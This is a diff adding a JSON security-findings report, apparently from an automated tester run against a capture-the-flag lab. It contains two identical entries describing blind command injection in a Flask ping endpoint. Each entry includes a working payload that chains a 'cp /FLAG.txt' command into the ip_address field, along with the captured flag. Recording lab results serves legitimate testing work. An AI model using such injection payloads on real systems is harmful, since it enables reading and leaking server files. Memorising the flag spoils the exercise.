@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T16:36:27.334522+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f7ccef2f-bd63-49b8-bb21-282e1bef3452",
+      "timestamp": "2026-04-14T16:36:27.334385+00:00",
+      "title": "Command Injection in Ping Tool - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43211",
+      "description": "Blind command injection vulnerability in the /ping endpoint. The Flask application passes user input directly to subprocess.Popen with shell=True, allowing arbitrary command execution. The application only returns 'Host is reachable!' or 'Host is unreachable!' (blind injection), but commands are still executed on the server.",
+      "evidence": "flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}",
+      "tool_used": "manual_http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /ping with ip_address=127.0.0.1;cp+/FLAG.txt+/app/static/FLAG.txt to copy flag to web-accessible location, then GET /static/FLAG.txt to retrieve: flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}",
+        "expected": "flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}"
+      }
+    },
+    {
+      "id": "e42abe3d-5084-47af-8f57-62644318e485",
+      "timestamp": "2026-04-14T16:36:27.414234+00:00",
+      "title": "Command Injection in Ping Tool - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43211",
+      "description": "Blind command injection vulnerability in the /ping endpoint. The Flask application passes user input directly to subprocess.Popen with shell=True, allowing arbitrary command execution. The application only returns 'Host is reachable!' or 'Host is unreachable!' (blind injection), but commands are still executed on the server.",
+      "evidence": "flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}",
+      "tool_used": "manual_http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /ping with ip_address=127.0.0.1;cp+/FLAG.txt+/app/static/FLAG.txt to copy flag to web-accessible location, then GET /static/FLAG.txt to retrieve: flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}",
+        "expected": "flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}"
+      }
+    }
+  ],
+  "diagrams": []
+}
